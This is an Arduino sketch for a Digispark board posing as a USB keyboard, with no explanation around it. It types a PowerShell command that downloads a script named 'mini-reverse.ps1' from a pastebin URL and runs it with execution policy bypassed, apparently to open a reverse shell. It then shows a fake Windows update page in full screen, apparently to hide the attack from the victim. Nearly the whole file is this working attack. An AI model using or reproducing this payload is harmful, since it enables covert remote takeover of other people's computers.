#define LAYOUT_SPANISH
#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell (New-Object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/dbSwSd8A','%TEMP%/mini-reverse.ps1');");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -File '%TEMP%\\mini-reverse.ps1'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("http://fakeupdate.net/win10/index.html");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F11);
  for(;;){ /*empty*/ }
}
